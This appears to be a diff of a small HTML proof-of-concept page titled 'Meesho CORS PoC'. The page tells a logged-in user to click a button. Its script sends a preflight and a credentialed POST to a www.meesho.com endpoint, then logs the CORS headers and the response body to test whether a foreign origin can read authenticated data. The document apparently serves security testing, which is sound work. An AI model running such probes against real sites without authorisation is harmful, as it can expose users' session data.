@@ -1,49 +1,55 @@
 <!DOCTYPE html>
 <html>
-<head><title>Meesho CORS Debug</title></head>
+<head><title>Meesho CORS Test</title></head>
 <body>
-<h2>Meesho CORS Test - Check Console + Network Tab</h2>
-<button onclick="testCORS()">Run Test</button>
+<h2>Meesho CORS PoC</h2>
+<p><strong>1. Log into Meesho first</strong><br>
+2. Click button below<br>
+3. Check Console + Network tab</p>
+
+<button onclick="runTest()">Run CORS Test</button>
 
 <script>
-async function testCORS() {
-  const url = "https://www.meesho.com/zMrsM4/K1zIxg/4/c3d/L0g4NSwh/Oauuppi50brE0JEGiw/ATJQAQ/ZD/JXERNKOUsB";
-
+async function runTest() {
   console.clear();
-  console.log("🔍 Testing from:", window.location.origin);
+  
+  // === CHANGE THIS URL TO A FRESH ONE ===
+  const targetUrl = "https://www.meesho.com/zMrsM4/K1zIxg/4/c3d/L0g4NSwh/Oauuppi50brE0JEGiw/ATJQAQ/ZD/JXERNKOUsB"; 
 
-  // 1. Test OPTIONS preflight
+  console.log("🔍 Testing from origin:", window.location.origin);
+  console.log("Target:", targetUrl);
+
+  // Try OPTIONS preflight
   try {
-    console.log("→ Sending OPTIONS preflight...");
-    const pre = await fetch(url, {
+    const preflight = await fetch(targetUrl, {
       method: "OPTIONS",
       headers: {
         "Origin": window.location.origin,
         "Access-Control-Request-Method": "POST",
-        "Access-Control-Request-Headers": "Content-Type"
+        "Access-Control-Request-Headers": "content-type"
       }
     });
-    console.log("Preflight Status:", pre.status);
-    console.log("Preflight ACAO:", pre.headers.get("access-control-allow-origin"));
-    console.log("Preflight ACAC:", pre.headers.get("access-control-allow-credentials"));
-  } catch(e) { console.error("Preflight failed:", e); }
+    console.log("✅ Preflight Status:", preflight.status);
+    console.log("ACAO:", preflight.headers.get("access-control-allow-origin"));
+    console.log("ACAC:", preflight.headers.get("access-control-allow-credentials"));
+  } catch(e) {
+    console.error("❌ Preflight blocked:", e.message);
+  }
 
-  // 2. Try actual POST
+  // Try actual request
   try {
-    console.log("→ Sending POST...");
-    const res = await fetch(url, {
+    const res = await fetch(targetUrl, {
       method: "POST",
       credentials: "include",
-      headers: { "Content-Type": "text/plain;charset=UTF-8" },
-      body: "test"
+      headers: { "Content-Type": "text/plain" },
+      body: "{}"
     });
-
     console.log("POST Status:", res.status);
     console.log("Response ACAO:", res.headers.get("access-control-allow-origin"));
-    const data = await res.text();
-    console.log("Response Body:", data);
+    const text = await res.text();
+    console.log("Response Body:", text);
   } catch(e) {
-    console.error("POST failed:", e.message);
+    console.error("❌ Main request failed:", e.message);
   }
 }
 </script>
